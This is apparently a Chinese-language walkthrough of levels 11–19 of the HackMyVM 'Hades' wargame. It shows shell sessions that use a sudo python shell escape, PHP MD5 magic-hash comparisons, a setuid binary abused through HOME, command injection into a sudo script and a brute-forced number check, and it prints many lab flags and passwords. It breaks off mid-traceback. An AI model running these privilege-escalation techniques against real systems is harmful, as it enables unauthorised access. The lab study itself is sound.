## 11 asia
```bash
asia@hades:~$ ls -la
total 32
drwxr-x--- 2 root asia 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 asia asia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 asia asia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 asia asia  807 Apr 23  2023 .profile
-rw-r----- 1 root asia   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root asia  188 Apr  5 06:36 mission.txt
asia@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^ngXdULWFWKCGtgxAQNv^
asia@hades:~$ cat mission.txt 
################
# MISSION 0x11 #
################

## EN ##
The user asteria is teaching us to program in python.

## ES ##
La usuaria asteria nos esta enseñando a programar en python.
asia@hades:~$ sudo -l
Matching Defaults entries for asia on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User asia may run the following commands on hades:
    (asteria) NOPASSWD: /usr/bin/python3
```

参考 https://gtfobins.github.io/gtfobins/python/#sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

进行提权：
```bash
asia@hades:~$ ls -la
total 32
drwxr-x--- 2 root asia 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 asia asia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 asia asia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 asia asia  807 Apr 23  2023 .profile
-rw-r----- 1 root asia   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root asia  188 Apr  5 06:36 mission.txt
asia@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^ngXdULWFWKCGtgxAQNv^
asia@hades:~$ cat mission.txt 
################
# MISSION 0x11 #
################

## EN ##
The user asteria is teaching us to program in python.

## ES ##
La usuaria asteria nos esta enseñando a programar en python.
asia@hades:~$ sudo -l
Matching Defaults entries for asia on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User asia may run the following commands on hades:
    (asteria) NOPASSWD: /usr/bin/python3
asia@hades:~$ sudo -u asteria /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
asteria@hades:/pwned/asia$ cd ~;whoami;id;ls -la
asteria
uid=2003(asteria) gid=2003(asteria) groups=2003(asteria)
total 36
drwxr-x--- 2 root    asteria 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 asteria asteria  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 asteria asteria 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 asteria asteria  807 Apr 23  2023 .profile
-rw-r----- 1 root    asteria   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    asteria  145 Apr  5 06:36 mission.txt
-rw-r----- 1 root    asteria  161 Apr  5 06:36 sihiri_old.php
```

## 12 asteria
11: asteria/hawMVJCYrBgoDAMVhuwT
```bash
asteria@hades:~$ grep -ra '\^*\^' .
./sihiri_old.php:print("Incorrect ^^");
./flagz.txt:^xSRhIftMsAwWvBAnqNZ^
asteria@hades:~$ cat mission.txt 
################
# MISSION 0x12 #
################

## EN ##
The user astraea believes in magic. 

## ES ##
La usuaria astraea cree en la magia.
asteria@hades:~$ cat sihiri_old.php 

<?php
$pass = hash('md5', $_GET['pass']);
$pass2 = hash('md5',"ASTRAEA_PASS");
if($pass == $pass2){
print("ASTRAEA_PASS");
}
else{
print("Incorrect ^^");
}
?>
```
如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。
随便找几个试一下 https://github.com/spaze/hashes/blob/master/md5.md
```bash
asteria@hades:~$ curl http://0.0.0.0/sihiri.php

Incorrect ^^
asteria@hades:~$ curl http://0.0.0.0/sihiri.php?pass=240610708&pass2=QLTHNDT
[1] 3820936
asteria@hades:~$ 
nZkEYtjvHElOtupXKzTE
```

## 13 astraea
```bash
asteria@hades:~$ ssh astraea@0.0.0
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/pwned/asteria/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/asteria/.ssh/known_hosts).

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \      
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


astraea@0.0.0.0's password:
^KssHQIAFsxUamecyXIUk^
Connection to 0.0.0.0 closed.
asteria@hades:~$ ^C
asteria@hades:~$ ssh astraea@0.0.0.0
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/pwned/asteria/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/asteria/.ssh/known_hosts).

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*                         
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


astraea@0.0.0.0's password:
^KssHQIAFsxUamecyXIUk^
Connection to 0.0.0.0 closed.
asteria@hades:~$
```
啥情况，提交flag，发现是隐藏的。。。。。这个意思就是登上去了，但是被秒踢掉了，尝试维持一下：
```bash
asteria@hades:~$ ssh astraea@0.0.0.0 -t 'whoami;id'
```
但是执行不了，尝试其他路子，看群主视频说传了busybox在`/var/tmp`，这是所有用户都可以编辑临时文件的地方：
```bash
asteria@hades:~$ ss -h
bash: /usr/bin/ss: Permission denied
asteria@hades:~$ nc -h
bash: nc: command not found
asteria@hades:~$ ls /var/tmp
07         31                a.txt           atalanta.txt  brute_31.sh  cve-2024-1086  flagz.txt   idd                  mission.txt.1  numbers.save  some2                        xx
1.gif      32                aaa.txt         aura.py       busybox      d              fscan       level16.py           name.txt       penelope      ss                           zzz
1.txt      333               ab.txt          av-98         c            dummy.png      fun.png     libexpect.so.5.45.4  names.txt      proc          taotao
100.txt    999               anames.txt      av98.py       cat          expect         get-pip.py  linpeas.sh           new.py         pwned         taotaotao
123        AV-98-master.zip  ar.sh           bNU           comb.txt     fi.sh          hatechars   mang                 new.sh         r.sh          test.py
12345      AV98              arete           bbb           conky.conf   fibi           id          mission.ttx          new.txt        result.txt    three_char_conbinations.txt
12345.txt  a                 arete_pass.txt  bbb.txt       core         flag.txt.1     id.zip      mission.txt          nmap           s             weird
asteria@hades:/var/tmp$ ./busybox netstat -alutp
netstat: can't scan /proc - are you root?
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:38595         0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:ircd          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:ssh           localhost:45418         ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45420         ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45424         ESTABLISHED -
tcp        0      0 localhost:45420         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:45428         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45414         ESTABLISHED -
tcp        0      0 localhost:45414         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45416         ESTABLISHED -
tcp        0      0 localhost:45418         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45428         ESTABLISHED -
tcp        0      0 localhost:45422         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:45416         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:45426         localhost:ssh           ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45426         ESTABLISHED -
tcp        0      0 localhost:ssh           localhost:45422         ESTABLISHED -
tcp        0   1368 hades:ssh               218.201.30.54:3343      ESTABLISHED -
tcp        0      0 localhost:45424         localhost:ssh           ESTABLISHED -
tcp        0      0 :::1965                 :::*                    LISTEN      -
tcp        0      0 :::http                 :::*                    LISTEN      -
tcp        0      0 :::ftp                  :::*                    LISTEN      -
tcp        0      0 :::ssh                  :::*                    LISTEN      -
udp        0      0 localhost:56483         0.0.0.0:*                           -
udp        0      0 0.0.0.0:44595           0.0.0.0:*                           -
udp        0      0 0.0.0.0:55168           0.0.0.0:*                           -
```
发现开启了ftp服务，尝试进行连接获取flag，再在平台提交获取密码：
```bash
ria@hades:/var/tmp$ ftp astraea@0.0.0.0
Connected to 0.0.0.0.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||53537|)
150 Here comes the directory listing.
-rw-r-----    1 0        2004           21 Apr 05 06:36 atalanta.txt
-rw-r-----    1 0        2004           22 Apr 05 06:36 flagz.txt
-rw-r-----    1 0        2004          181 Apr 05 06:36 mission.txt
226 Directory send OK.
ftp> get flagz.txt
local: flagz.txt remote: flagz.txt
229 Entering Extended Passive Mode (|||47975|)
150 Opening BINARY mode data connection for flagz.txt (22 bytes).
100% |*****************************************************************************************************************************************|    22       15.98 KiB/s    00:00 ETA 
226 Transfer complete.
22 bytes received in 00:00 (3.49 KiB/s)
ftp> exit
221 Goodbye.
asteria@hades:/var/tmp$ cat flagz.txt 
^nqTHTzMzDPDJrKPCfVR^

```
12: astraea/nZkEYtjvHElOtupXKzTE
忘了连不上了。。。。
下载 mission接着做吧：
```bash
asteria@hades:/var/tmp$ ftp astraea@0.0.0.0
Connected to 0.0.0.0.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir 
229 Entering Extended Passive Mode (|||10777|)
150 Here comes the directory listing.
-rw-r-----    1 0        2004           21 Apr 05 06:36 atalanta.txt
-rw-r-----    1 0        2004           22 Apr 05 06:36 flagz.txt
-rw-r-----    1 0        2004          181 Apr 05 06:36 mission.txt
226 Directory send OK.
ftp> get mission.txt
local: mission.txt remote: mission.txt
229 Entering Extended Passive Mode (|||31679|)
150 Opening BINARY mode data connection for mission.txt (181 bytes).
100% |*****************************************************************************************************************************************|   181      145.24 KiB/s    00:00 ETA 
226 Transfer complete.
181 bytes received in 00:00 (29.82 KiB/s)
ftp> get atalanta.txt
local: atalanta.txt remote: atalanta.txt
229 Entering Extended Passive Mode (|||61686|)
150 Opening BINARY mode data connection for atalanta.txt (21 bytes).
100% |*****************************************************************************************************************************************|    21       16.53 KiB/s    00:00 ETA 
226 Transfer complete.
21 bytes received in 00:00 (3.43 KiB/s)
ftp> exit
221 Goodbye.
asteria@hades:/var/tmp$ cat mission.txt
################
# MISSION 0x13 #
################

## EN ##
The user atalanta has done something with our account. 

## ES ##
La usuaria atalanta ha hecho algo con nuestra cuenta.
asteria@hades:/var/tmp$ cat atalanta.txt 
mUcSNQlaXtwSvGcgeTYZ
```
## 14 atalanta
```bash
atalanta@hades:~$ ls -la
total 60
drwxr-x--- 1 root     atalanta  4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 atalanta atalanta   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 atalanta atalanta  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 atalanta atalanta   807 Apr 23  2023 .profile
-rw-r----- 1 root     atalanta    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     atalanta   237 Apr  5 06:36 mission.txt
-r-sr-s--- 1 root     atalanta 16608 Apr  5 06:36 weird
-rwxrwxrwx 1 atalanta atalanta    21 Jun 12 09:05 weird.c
atalanta@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^XXZbDJTQQWCHJWTGeOw^
./weird:�@����%r/h
                  �0����%j/h
�����%�.f�1�I��^H��H���PTE1�1�H�=��.�f.�@H�=)/H�"/H9�tH�^.H��t  �����H�=�.H�5�.H)�H��H��?H��H�H��tH�-.H����fD�����=�.u+UH�=
atalanta@hades:~$ cat mission.txt 
################
# MISSION 0x14 #
################

## EN ##
User athena lets us run her program, but she hasn't left us her source code.

## ES ##
La usuaria athena nos deja ejecutar su programa, pero no nos ha dejado su codigo fuente.

atalanta@hades:~$ ./weird
HOME detected: /pwned/atalanta
Segmentation fault
atalanta@hades:~$ cat weird.c
kmQMpZsXgOsnzGReRcoV
```
啥情况？先把文件传到`/var/tmp`，再传到本机进行逆向分析一下：
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char ptr; // [rsp+Fh] [rbp-4B1h]
  char v6; // [rsp+400h] [rbp-C0h]
  int v7; // [rsp+418h] [rbp-A8h]
  __uid_t uid; // [rsp+41Ch] [rbp-A4h]
  struct passwd *v9; // [rsp+490h] [rbp-30h]
  int v10; // [rsp+49Ch] [rbp-24h]
  FILE *v11; // [rsp+4A0h] [rbp-20h]
  char *command; // [rsp+4A8h] [rbp-18h]
  FILE *stream; // [rsp+4B0h] [rbp-10h]
  char *file; // [rsp+4B8h] [rbp-8h]

  setuid(0x7D6u);
  setgid(0x7D6u);
  file = getenv("HOME");
  printf("HOME detected: %s\n", file);
  v3 = getenv("HOME");
  stream = fopen(v3, "w");
  command = "/bin/cat /var/lib/me";
  ptr = 0;
  v11 = popen("/bin/cat /var/lib/me", "r");
  if ( !v11 )
  {
    perror("popen() failed.");
    exit(1);
  }
  while ( fread(&ptr, 1uLL, 1uLL, v11) )
    fputc(ptr, stream);
  pclose(v11);
  pclose(stream);
  v10 = stat(file, (struct stat *)&v6);
  v9 = getpwuid(uid);
  if ( v9->pw_name != "atalanta" )
    v10 = chmod(file, v7 & 0xFFFFFFCA | 0x10);
  stat(file, (struct stat *)&v6);
  return 0;
```
墨师傅[blog](https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/HMVLabs/Hades/11-20)有源码：
```C
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
int main()
{
    setuid(2006);
    setgid(2006);
    const char *filename;
    struct stat fs;
    int r;
    filename = getenv("HOME");
    printf ("HOME detected: %s\n",filename);
    char cmd[1000];
    FILE *out_file = fopen(getenv("HOME"), "w");
    FILE *fpipe;
    char *command = "/bin/cat /var/lib/me";
    char c = 0;

    if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }

    while (fread(&c, sizeof c, 1, fpipe))
    {
        fprintf(out_file, "%c",c);
    }
    pclose(fpipe);
    pclose(out_file);
    r = stat(filename,&fs);
    struct passwd *pw = getpwuid(fs.st_uid);
    if (pw->pw_name != "atalanta"){
    r = chmod(filename, fs.st_mode & ~(S_IROTH)+~(S_IRGRP) | S_IWGRP );
    }
    stat(filename,&fs);
    return EXIT_SUCCESS;
}
```
脚本做了如下几件事情：
- 赋权 2006
  - atalanta@hades:/var/tmp$ id athena
  - uid=2006(athena) gid=2006(athena) groups=2006(athena)
- 获取并打印HOME环境变量
- 尝试打开HOME目录为文件
- 执行外部命令并捕获输出
- 将捕获的内容写入到HOME环境变量指定的位置
- 关闭文件指针和管道
- 检查文件的所有者并尝试更改权限
- 再次获取文件状态
故利用方法为先将HOME设置为一个文件，再运行程序，最后进行读取：
```bash
 atalanta@hades:/var/tmp$ touch /tmp/flaggggggg
atalanta@hades:/var/tmp$ echo $HOME
/pwned/atalanta
atalanta@hades:/var/tmp$ HOME=/tmp/flaggggggg
atalanta@hades:/var/tmp$ echo $HOME
/tmp/flaggggggg
atalanta@hades:/var/tmp$ cd /pwned/atalanta
atalanta@hades:/pwned/atalanta$ ls
flagz.txt  mission.txt  weird  weird.c
atalanta@hades:/pwned/atalanta$ chmod 777 HOME
chmod: cannot access 'HOME': No such file or directory
atalanta@hades:/pwned/atalanta$ chmod 777 /tmp/flaggggggg
atalanta@hades:/pwned/atalanta$ ./weird
HOME detected: /tmp/flaggggggg
atalanta@hades:/pwned/atalanta$ cat /tmp/flaggggggg
kmQMpZsXgOsnzGReRcoV
```

## 15 athena
```bash
athena@hades:~$ ls -la
total 36
drwxr-x--- 2 root   athena 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 athena athena  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 athena athena 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 athena athena  807 Apr 23  2023 .profile
-rw-r----- 1 root   athena  166 Apr  5 06:36 auri_old.sh
-rw-r----- 1 root   athena   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   athena  160 Apr  5 06:36 mission.txt
athena@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^oGwmbNYdtHwJgznZdur^
athena@hades:~$ cat mission.txt 
################
# MISSION 0x15 #
################

## EN ##
User aura lets us use her new script.

## ES ##
La usuaria aura nos deja utilizar su nuevo script.
athena@hades:~$ cat auri_old.sh 

#!/bin/bash
echo "What?"
read hackme
#Secure the condition!
#if [[ $hackme =~ "????????" ]]; then
#exit
#fi
#Add newest Aura pass!
#$hackme AURANEWPASS 2>/dev/null

athena@hades:~$ sudo -l
Matching Defaults entries for athena on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User athena may run the following commands on hades:
    (aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
whoami
```
这段代码的逻辑如下：
- 输出，提示用户进行输入
- 读取用户输入
- 正则匹配不允许的字符(????????只是用来占位子的)
- 执行命令
所以尝试让他进行输出即可

```bash
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
cat
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
more
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
less
athena@hades:~$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
What?
printf
TiqpedAFjwmVyBlYpzRh
```

## 16 aura
```bash
aura@hades:~$ ls -la
total 52
drwxr-x--- 2 root aura  4096 Apr  5 06:36 .
drwxr-xr-x 1 root root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 aura aura   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 aura aura  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 aura aura   807 Apr 23  2023 .profile
-rw-r-x--- 1 root aura   160 Apr  5 06:36 auri.sh
-rw-r----- 1 root aura    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root aura   168 Apr  5 06:36 mission.txt
-rw---x--- 1 root aura 16064 Apr  5 06:36 numbers
aura@hades:~$ grep -ra '\^*\^' .
grep: ./numbers: Permission denied
./flagz.txt:^YFMNmPnlKNpnWiYOhYy^
aura@hades:~$ cat mission.txt 
################
# MISSION 0x16 #
################

## EN ##
User aegle has a good memory for numbers.

## ES ##
La usuaria aegle tiene buena memoria para los numeros.
aura@hades:~$ cat auri.sh 

#!/bin/bash
echo "What?"
read hackme
if [[ $hackme == *"e"* || $hackme == *"o"* || $hackme == *"?"* ]]; then
exit
fi
$hackme TiqpedAFjwmVyBlYpzRh 2>/dev/null

aura@hades:~$ ./numbers 
Enter one number:
1
Number OK
Enter next number:
2
Number OK
Enter next number:

3
Number OK
Enter next number:
4

NO :_(
```
运气不错第一次就找到三个，尝试继续进行探测，阔以尝试[群主的方案](https://www.bilibili.com/video/BV1y642137HN/?spm_id_from=333.788&vd_source=8981ead94b755f367ac539f6ccd37f77)：

```bash
for i in $(seq 9); do echo -e "1\n2\n3\n$i" | ./numbers;sleep 0.2; done
```

```bash
aura@hades:~$ for i in $(seq 9); do echo -e "1\n2\n3\n$i" | ./numbers  | grep -c 'OK'; sleep 0.2; done | nl
     1  4
     2  3
     3  3
     4  3
     5  3
     6  3
     7  3
     8  3
     9  3
```
一个一个尝试即可得到密码:1231239111126
```bash
aura@hades:~$ ./numbers
Enter one number:
1
Number OK
Enter next number:
2
Number OK
Enter next number:
3
Number OK
Enter next number:
1
Number OK
Enter next number:
2
Number OK
Enter next number:
3
Number OK
Enter next number:
9
Number OK
Enter next number:
1
Number OK
Enter next number:
1
Number OK
Enter next number:
1
Number OK
Enter next number:
1
Number OK
Enter next number:
2
Number OK
Enter next number:
6
YRturIymmHSdBmEClEGe
```

## 17 aegle
```bash
aegle@hades:~$ ls -la
total 36
drwxr-x--- 2 root  aegle    4096 Apr  5 06:36 .
drwxr-xr-x 1 root  root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 aegle aegle     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 aegle aegle    3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 aegle aegle     807 Apr 23  2023 .profile
-rw-r----- 1 root  calliope   21 Apr  5 06:36 calliope_pass.txt
-rw-r----- 1 root  aegle      22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root  aegle     176 Apr  5 06:36 mission.txt
aegle@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^XCwOqgVvWpDVwPVVUJa^
grep: ./calliope_pass.txt: Permission denied
aegle@hades:~$ cat mission.txt 
################
# MISSION 0x17 #
################

## EN ##
User calliope likes to have her things looked at.

## ES ##
A la usuaria calliope le gusta que le miren sus cosas.
aegle@hades:~$ sudo -l
Matching Defaults entries for aegle on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User aegle may run the following commands on hades:
    (calliope) NOPASSWD: /bin/cat
aegle@hades:~$ sudo -u calliope /bin/cat calliope_pass.txt        
/bin/cat: calliope_pass.txt: Permission denied
aegle@hades:~$ sudo -u calliope /bin/cat /pwned/calliope/flagz.txt
^rFWOMwBJDidqSNtEJGJ^
```

## 18 calliope 
```bash
calliope@hades:~$ ls -la
total 52
drwxr-x--- 3 root     calliope  4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 calliope calliope   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 calliope calliope  3533 Apr  5 06:36 .bashrc
-rw-r--r-- 1 calliope calliope   807 Apr 23  2023 .profile
drwxr-xr-x 2 root     root      4096 Apr  5 06:36 .ssh
-rw-r----- 1 root     calliope    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     calliope   175 Apr  5 06:36 mission.txt
-r-s--s--- 1 root     calliope 16360 Apr  5 06:36 writeme
calliope@hades:~$ cat flagz.txt 
^rFWOMwBJDidqSNtEJGJ^
calliope@hades:~$ cat mission.txt 
################
# MISSION 0x18 #
################

## EN ##
The user calypso often uses write to communicate.

## ES ##
La usuaria calypso suele usar write para comunicarse.
calliope@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^rFWOMwBJDidqSNtEJGJ^
grep: ./writeme: Permission denied
calliope@hades:~$ ./writeme 
Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!

hgbe02@pwn:~/temp$ tldr mesg
mesg
Check or set a terminal's ability to receive messages from other users, usually from the write command.See also write, talk.More information: https://manned.org/mesg.1p.

 - Check terminal's openness to write messages:
   mesg

 - Disallow receiving messages from the write command:
   mesg n

 - Allow receiving messages from the write command:
   mesg y

calliope@hades:~$ mesg  
is n
calliope@hades:~$ mesg y
Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!TAMYefoHcCPmexwImodo^OCbFzMIKPQOZQMEUKwEi^Cannot send you my pass!
```

## 19 calypso
```bash
pso@hades:~$ ls -la
total 8556
drwxr-x--- 2 root    calypso    4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 calypso calypso     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 calypso calypso    3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 calypso calypso     807 Apr 23  2023 .profile
-rw-r----- 1 root    calypso 8726358 Dec 20  2021 cassy.wav
-rw-r----- 1 root    calypso      22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    calypso     164 Apr  5 06:36 mission.txt
calypso@hades:~$ cat cat flagz.txt 
cat: cat: No such file or directory
^pssqdorRTYuTKuQBOYd^
calypso@hades:~$ cat mission.txt 
################
# MISSION 0x19 #
################

## EN ##
User cassandra always wanted to be on TV.

## ES ##
La usuaria cassandra siempre quiso salir en la TV.
```
这是sstv的解码，尝试使用工具进行解码，我使用的是 https://github.com/colaclanth/sstv
先传到kali：
```bash
┌──(kali㉿kali)-[~/temp]
└─$ scp -P 6666 calypso@hades.hackmyvm.eu:/pwned/calypso/cassy.wav .
The authenticity of host '[hades.hackmyvm.eu]:6666 ([185.233.104.77]:6666)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[hades.hackmyvm.eu]:6666' (ED25519) to the list of known hosts.

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____                     
                __     __           _____         ____________      _____\    \            _____   
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    | 
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/| 
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   || 
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/ 
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \      
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|     
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |     
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/      
                                                                        |___|/                     
        
                                       **                                    **.                    
                                          ,*                                **                       
                                             *,                          ,*                          
                                                *                      **                            
                                                *,                .*                              
                                                   *.           **                                 
                                                      **      ,*,                                 
                                                         ** *, 
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+

                                          
calypso@hades.hackmyvm.eu's password: 
cassy.wav                                                                                                                                                               100% 8522KB 709.6KB/s   00:12    
```
然后尝试进行解码：
```bash
┌──(kali㉿kali)-[~/sstv-master]
└─$ sudo sstv -d ../temp/cassy.wav -o result.png
[sstv] Searching for calibration header... Found!    
Traceback (most recent call last):
  File "/usr/local/bin/sstv", line 33, in <module>
    sys.exit(load_entry_point('sstv==0.1', 'console_scripts', 'sstv')())
